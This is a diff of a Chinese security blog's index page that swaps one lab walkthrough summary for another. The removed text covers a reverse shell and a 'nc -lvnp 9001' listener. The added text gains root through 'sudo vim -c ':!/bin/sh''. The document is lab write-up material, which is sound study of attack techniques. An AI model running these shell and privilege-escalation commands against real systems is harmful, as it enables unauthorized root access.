-<p>这里经常会跳这些内容，说明会定时执行，所以我们可以使用一个C的反弹shell：<a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
-<p><img src="/images/red/image-20230609002133937.png" alt="image-20230609002133937"></p>
-<p><img src="/images/red/image-20230609002206170.png" alt="image-20230609002206170"></p>
-<p>然后使用python的http服务，让靶机下载这个文件（靶机上的这个文件删除掉，下面的shell又断掉了，会导致格式有点难看）</p>
-<p><img src="/images/red/image-20230609002351376.png" alt="image-20230609002351376"></p>
-<p><img src="/images/red/image-20230609002432711.png" alt="image-20230609002432711"></p>
-<p>然后使用<code>rlwrap nc -lvnp 9001</code>监听，这里我们可以使用gcc自己去执行（如果你不想等待的话）</p>
-<p><img src="/images/red/image-20230609002636278.png" alt="image-20230609002636278"></p>
-<p>成功提权</p>
-<p><img src="/images/red/image-20230609002700730.png" alt="image-20230609002700730"></p>
-<p><img src="/images/red/image-20230609002730825.png" alt="image-20230609002730825"></p>
+<p><img src="/images/napping/image-20230609114833108.png" alt="image-20230609114833108"></p>
+<p>使用<code>sudo -l</code>获取能执行的命令，发现<code>vim</code>是以root运行的，所以我们可以使用其来提权</p>
+<p><img src="/images/napping/image-20230609115218940.png" alt="image-20230609115218940"></p>
+<p>使用<code>sudo /usr/bin/vim -c &#39;:!/bin/sh&#39;</code>提权</p>
+<p><img src="/images/napping/image-20230609115323989.png" alt="image-20230609115323989"></p>
+<p>使用<code>crontab -l</code>查看定时任务</p>
+<p><img src="/images/napping/image-20230609115400172.png" alt="image-20230609115400172"></p>
 
       
     </div>
@@ -386,7 +356,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/14/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/16/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/14/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/16/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -410,7 +380,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
